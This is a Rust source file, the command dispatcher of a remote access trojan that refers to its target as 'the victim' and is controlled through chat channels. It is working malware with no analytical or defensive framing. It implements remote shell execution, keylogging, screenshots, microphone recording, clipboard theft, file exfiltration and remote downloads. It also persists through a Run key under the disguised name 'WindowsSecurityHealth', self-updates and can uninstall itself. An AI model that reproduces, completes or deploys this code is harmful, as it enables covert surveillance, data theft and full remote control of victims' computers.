// language: Rust, file: src/commands.rs
// Command surface. Text results go to the victim's `console` channel, files to `files`,
// system/geo to `information`.
#![allow(dead_code)]
use anyhow::Result;
use serde_json::Value;

use crate::config::Config;
use crate::stoat::Stoat;
use crate::workspace::Workspace;
use crate::{capture, host, info, input};

const HELP: &str = "\
!help                      this
!info                      refresh the information channel
!sysinfo                   host / os / cpu / mem
!shell <cmd>               run cmd.exe /C, return output
!exec <exe> [args]         launch detached
!ps                        process list
!kill <pid>                terminate pid
!screenshot                primary monitor -> files channel
!mic <secs>                record default mic -> files channel
!freeze [secs]             block input; secs = auto-release (e.g. !freeze 30)
!keylog start|stop|dump|clear
!clipboard [text]          get or set clipboard
!ls [path]                 directory listing
!getfile <path>            exfil a local file
!putfile [dest]            save the attachment on this message
!download <url> [dest]     pull a remote file
!persist / !unpersist      HKCU Run autostart
!msg <text>                message box
!monitor on|off            display power
!lock                      lock workstation
!update                    pull newest build from #update and restart
!uninstall                 remove payload + launcher + Run key, then stop
!exit                      terminate agent";

fn stamp() -> String {
    chrono::Local::now().format("%Y%m%d-%H%M%S").to_string()
}

pub async fn dispatch(
    st: &Stoat,
    cfg: &Config,
    ws: &Workspace,
    content: &str,
    attachments: &[Value],
) -> Result<()> {
    let console = ws.channels.console.as_str();
    let files = ws.channels.files.as_str();
    let infoch = ws.channels.info.as_str();

    let raw = content.trim_start_matches(&cfg.prefix).trim();
    let mut it = raw.splitn(2, char::is_whitespace);
    let cmd = it.next().unwrap_or("").to_ascii_lowercase();
    let arg = it.next().unwrap_or("").trim().to_string();

    match cmd.as_str() {
        "help" => st.send_code(console, HELP).await?,
        "ping" => st.send(console, "pong").await?,
        "id" | "whoami" => st.send(console, &format!("bot {}", st.bot_id)).await?,
        "info" => {
            let _ = st.purge_channel(infoch).await;
            let text = info::dump(cfg, ws).await;
            st.send_code(infoch, &text).await?;
        }
        "sysinfo" => st.send_code(console, &host::sysinfo_text()).await?,
        "shell" | "cmd" | "sh" => {
            let out = tokio::task::spawn_blocking(move || host::run_shell(&arg)).await?;
            st.send_code(console, &out).await?;
        }
        "exec" | "start" => {
            host::exec(&arg)?;
            st.send(console, "launched").await?;
        }
        "ps" => st.send_code(console, &host::process_list()).await?,
        "kill" => {
            let pid: u32 = arg.parse().unwrap_or(0);
            st.send(console, &host::kill_pid(pid)).await?;
        }
        "screenshot" | "ss" => {
            let bytes = tokio::task::spawn_blocking(capture::screenshot_jpeg).await??;
            st.send_file(files, &format!("screen-{}.jpg", stamp()), bytes, "screenshot")
                .await?;
        }
        "mic" => {
            let secs: u64 = arg.parse().unwrap_or(5);
            let bytes = tokio::task::spawn_blocking(move || capture::record_wav(secs)).await??;
            st.send_file(files, &format!("mic-{}.wav", stamp()), bytes, "microphone")
                .await?;
        }
        "freeze" => {
            let secs: u64 = arg.trim().parse().unwrap_or(0);
            input::freeze();
            if secs > 0 {
                let st2 = st.clone();
                let ch = console.to_string();
                tokio::spawn(async move {
                    tokio::time::sleep(std::time::Duration::from_secs(secs)).await;
                    input::unfreeze();
                    let _ = st2.send(&ch, &format!("input released after {secs}s")).await;
                });
                st.send(console, &format!("input frozen for {secs}s")).await?;
            } else {
                st.send(console, "input frozen (use !unfreeze)").await?;
            }
        }
        "unfreeze" => {
            input::unfreeze();
            st.send(console, "input released").await?;
        }
        "keylog" => match arg.split_whitespace().next().unwrap_or("dump") {
            "start" => {
                input::keylog_start();
                st.send(console, "keylog started").await?;
            }
            "stop" => {
                input::keylog_stop();
                st.send(console, "keylog stopped").await?;
            }
            "clear" => {
                input::keylog_clear();
                st.send(console, "keylog cleared").await?;
            }
            _ => {
                let d = input::keylog_dump();
                st.send_code(console, if d.is_empty() { "(empty)" } else { &d })
                    .await?;
            }
        },
        "clipboard" | "clip" => {
            if arg.is_empty() {
                let t = host::clip_get().unwrap_or_default();
                st.send_code(console, &t).await?;
            } else {
                host::clip_set(&arg)?;
                st.send(console, "clipboard set").await?;
            }
        }
        "ls" | "dir" => st.send_code(console, &host::list_dir(&arg)).await?,
        "getfile" | "grab" => {
            let path = arg.clone();
            let bytes = tokio::task::spawn_blocking(move || std::fs::read(&path)).await??;
            let name = std::path::Path::new(&arg)
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| "file.bin".into());
            st.send_file(files, &name, bytes, "file").await?;
        }
        "putfile" | "receive" => {
            if attachments.is_empty() {
                st.send(console, "no attachment on that message").await?;
            } else {
                let a = &attachments[0];
                let tag = a["tag"].as_str().unwrap_or("attachments");
                let id = a["_id"].as_str().unwrap_or("");
                let fname = a["filename"].as_str().unwrap_or("recv.bin");
                let dest = if arg.is_empty() { fname.to_string() } else { arg.clone() };
                let bytes = st.download(tag, id).await?;
                std::fs::write(&dest, &bytes)?;
                st.send(console, &format!("saved {dest} ({} bytes)", bytes.len()))
                    .await?;
            }
        }
        "download" => {
            let mut parts = arg.splitn(2, char::is_whitespace);
            let url = parts.next().unwrap_or("");
            let dest = parts.next().unwrap_or("download.bin").to_string();
            if url.is_empty() {
                st.send(console, "usage: !download <url> [dest]").await?;
            } else {
                let bytes = st.raw_get(url).await?;
                std::fs::write(&dest, &bytes)?;
                st.send(console, &format!("saved {dest} ({} bytes)", bytes.len()))
                    .await?;
            }
        }
        "persist" => {
            let name = std::env::var("RAT_NAME")
                .unwrap_or_else(|_| "WindowsSecurityHealth".into());
            let p = host::ensure_autostart(&name)?;
            st.send(console, &format!("persisted -> {p}")).await?;
        }
        "unpersist" => {
            let name = std::env::var("RAT_NAME")
                .unwrap_or_else(|_| "WindowsSecurityHealth".into());
            host::unpersist(&name)?;
            st.send(console, "autostart removed").await?;
        }
        "msg" | "popup" => {
            let text = if arg.is_empty() { "hello".to_string() } else { arg.clone() };
            tokio::task::spawn_blocking(move || host::message_box("System", &text)).await?;
            st.send(console, "shown").await?;
        }
        "monitor" => {
            if arg.eq_ignore_ascii_case("on") {
                host::monitor_on();
            } else {
                host::monitor_off();
            }
            st.send(console, "ok").await?;
        }
        "lock" => {
            host::lock_workstation();
            st.send(console, "locked").await?;
        }
        "update" => {
            st.send(console, "checking #update ...").await?;
            match crate::update::stage(st, cfg, ws).await {
                Ok(Some(label)) => {
                    st.send(console, &format!("staged {label}; restarting")).await?;
                    match crate::update::relaunch_and_exit() {
                        Ok(()) => std::process::exit(0),
                        Err(e) => {
                            st.send(console, &format!("restart failed: {e:#}")).await?;
                        }
                    }
                }
                Ok(None) => st.send(console, "already on the newest build").await?,
                Err(e) => st.send(console, &format!("update failed: {e:#}")).await?,
            }
        }
        "uninstall" | "cleanup" | "remove" => {
            let (run_status, removed, dll) = host::purge_install();
            let list = if removed.is_empty() {
                "(none)".to_string()
            } else {
                removed
                    .iter()
                    .map(|p| p.display().to_string())
                    .collect::<Vec<_>>()
                    .join(", ")
            };
            st.send(
                console,
                &format!(
                    "uninstall: run key {run_status}; removed {list}; deleting {} on exit",
                    dll.display()
                ),
            )
            .await?;
            host::schedule_self_cleanup(&dll);
            std::process::exit(0);
        }
        "exit" | "quit" => {
            st.send(console, "bye").await.ok();
            std::process::exit(0);
        }
        _ => {
            st.send(console, &format!("unknown command: {cmd}")).await?;
        }
    }
    Ok(())
}
